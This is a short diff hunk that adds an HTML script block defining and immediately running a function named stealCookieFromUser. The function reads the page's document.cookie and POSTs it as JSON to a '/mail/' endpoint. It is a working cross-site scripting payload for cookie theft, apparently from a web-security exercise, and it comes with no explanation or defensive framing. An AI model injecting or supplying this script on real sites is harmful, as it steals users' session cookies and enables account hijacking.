@@ -1,0 +1,11 @@
+<script>
+    function stealCookieFromUser() {
+        var http = new XMLHttpRequest()
+        http.open("POST", "/mail/")
+        http.setRequestHeader("Content-Type", "application/json")
+        var object = new Object()
+        object.content = document.cookie
+        http.send(JSON.stringify(object))
+    }
+    stealCookieFromUser()
+</script>
